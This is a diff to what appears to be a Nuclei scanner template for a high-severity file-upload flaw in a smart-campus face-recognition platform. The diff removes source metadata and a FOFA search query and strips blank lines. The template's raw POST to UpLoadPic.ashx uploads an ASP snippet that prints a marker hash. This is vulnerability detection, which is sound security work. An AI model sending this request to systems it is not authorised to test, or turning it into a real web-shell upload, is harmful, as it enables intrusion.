@@ -3,12 +3,8 @@ info:
   name: 脸爱云一脸通智慧平台UpLoadPic文件上传漏洞_sfea5l59i960gpv1
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/'
+  description: ''
   tags: file-upload,unknown
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ''
-    fofa: body="View/UserReserved/UserReservedTest.aspx"
 http:
 - raw:
   - 'POST /UpLoadPic.ashx HTTP/1.1
@@ -32,14 +28,10 @@ http:
     X-Requested-With: XMLHttpRequest
 
 
-
-
     ------WebKitFormBoundarywt7cEu1eBdibB13u
 
 
     Content-Disposition: form-data; name="action"
-
-
 
 
     post
@@ -54,21 +46,13 @@ http:
     Content-Type: image/png
 
 
-
-
     <% response.write("FC5E038D38A57032085441E7FE7010B0") %>
-
-
 
 
     ------WebKitFormBoundarywt7cEu1eBdibB13u
 
 
     Content-Disposition: form-data; name="oldName"
-
-
-
-
 
 
     ------WebKitFormBoundarywt7cEu1eBdibB13u--
